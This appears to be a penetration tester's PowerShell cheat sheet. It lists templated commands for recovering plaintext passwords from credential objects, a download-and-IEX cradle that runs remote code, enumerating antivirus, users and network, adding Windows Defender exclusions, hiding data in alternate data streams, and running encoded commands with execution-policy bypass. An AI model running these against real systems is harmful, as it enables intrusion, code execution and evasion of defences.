# PowerShell

---

## Create a Credential (`PSCredential` Object)

```powershell
$password = ConvertTo-SecureString -AsPlain $PASSWORD -Force
$credential = New-Object System.Management.Automation.PSCredential($USERNAME, $password)
```

---

## Recover the Plaintext Password from a `PSCredential` Object

```powershell
$bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password)
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
```

---

## Download a File via HTTP(S)

```powershell
Invoke-WebRequest -Uri $URL -OutFile $OUTPUT_FILE_PATH
```

---

## Import a Remote PowerShell Module

Download the module and save it as a string in memory. Use `Invoke-Expression` to execute the string as actual PowerShell. This will define all of the functions for use on that line. This means that all the commands you need to execute from the module must be executed on the same line as the `Invoke-Expression` (`IEX`) statement.

```powershell
$module = (New-Object Net.Webclient).DownloadString("$REMOTE_MODULE_URL")
IEX $module; $COMMAND_1; $COMMAND_2; $COMMAND_N
```

---

## Query Operating System Information via WMI

```powershell
Get-CimInstance -ClassName "CIM_OperatingSystem"
```

---

## Query Operating System Version from .NET `Systen.Environment` Library

```powershell
[System.Environment]::OSVersion.Version
```

---

## Query Installed Updates via WMI

```powershell
Get-HotFix
```

```powershell
Get-CimInstance -ClassName "Win32_QuickFixEngineering"
```

---

## Query Installed Antivirus via WMI

```powershell
Get-CimInstance -Namespace root/securitycenter2 -ClassName antivirusproduct
```

---

## Query Environment Variables

```powershell
Get-Item Env:
```

---

## List Currently Running Processes

```powershell
Get-Process
```

---

## Query Network Adapters

```powershell
Get-NetAdapter
```

---

## Query Routing Table

```powershell
Get-NetRoute
```

---

## Query ARP Cache

```powershell
Get-NetNeighbor
```

---

## Query Network Listeners & Connections

```powershell
Get-NetTCPConnection | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | ft -Autosize -Property ProcessName, LocalAddress, LocalPort, RemoteAddress, RemotePort, State
```


---

## Query Local Users

```powershell
Get-LocalUser
```

---

## Query a Particular Local User

```powershell
Get-LocalUser $USERNAME
```

---

## Query Local Groups

```powershell
Get-LocalGroup
```

---

## Query a Particular Local Group

```powershell
Get-LocalGroup $GROUP_NAME
```

---

## Query SMB Shares

```powershell
Get-SmbShare
```

---

## Import a PowerShell Module

```powershell
Import-Module $PATH_TO_POWERSHELL_MODULE
```

---

## Add a Windows Defender Exclusion

In an administrative or SYSTEM context:

```powershell
Add-MpPreference -ExclusionPath $PATH_TO_FOLDER_TO_EXCLUDE
```

---

## Recursively Search the File System

```powershell
Get-ChildItem -Path C:\ -Include "$FILENAME" -Recurse -ErrorAction SilentlyContinue
```

- `$FILENAME` can contain wildcards

---

## Query Firewall Rules

```powershell
Get-NetFirewallRule
```

---

## Query AppLocker Policies

```powershell
Get-AppLockerPolicy
```

---

## Get PowerShell Version

```powershell
Get-Host | Select Version
```

---

## Find All Files with Alternate Data Streams

```powershell
Get-ChildItem -Recurse $DIRECTORY | % { Get-Item $_.FullName -Stream * } | where Stream -ne ':$Data'
```

---

## Show a File's Alternate Data Streams

```powershell
Get-Item -Path $FILE_PATH -Stream *
```

---

## Read a File's Alternate Data Stream

```powershell
Get-Content -Path $FILE_PATH -Stream $STREAM_NAME
```

---

## Write to a File's Alternate Data Stream

```powershell
Set-Content -Path $FILE_PATH -Stream $STREAM_NAME -Value $VALUE
```

---

## Translate an IPv4 Address into an Integer

```powershell
([System.Net.IPAddress]"$IPV4_ADDRESS").Address
```

---

## Create an IPv4 Address from an Integer

Be careful here. PowerShell expect `$INTEGER` to be the integer of the IP address with its octets reversed, so don't use an online IPv4 to integer converter to get `$INTEGER`. Instead, use [[powershell#Translate an IPv4 Address into an Integer|PowerShell itself]].

```powershell
New-Object System.Net.IPAddress($INTEGER)
```

---

## Execute a Command

```powershell
powershell.exe [-ep bypass] -c $COMMAND
```

---

## Base64 Encode a String

```powershell
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($STRING))
```

---

## Base64 Decode a String

```powershell
[System.Convert]::FromBase64String($STRING)
```

---

## Write Base64 Decoded Bytes to Disk

```powershell
[IO.File]::WriteAllBytes($PATH, [System.Convert]::FromBase64String($STRING))
```

---

## Execute Base64 Encoded Command

```powershell
powershell.exe [-ep bypass] -enc $BASE64_ENCODED_COMMAND
```

where `$BASE64_ENCODED_COMMAND` is a base64-encoded UTF-16LE string of the command. You can create those on `bash` as follows:

```bash
$ echo -n $COMMAND | iconv -t utf-16le | base64 -w 0
```
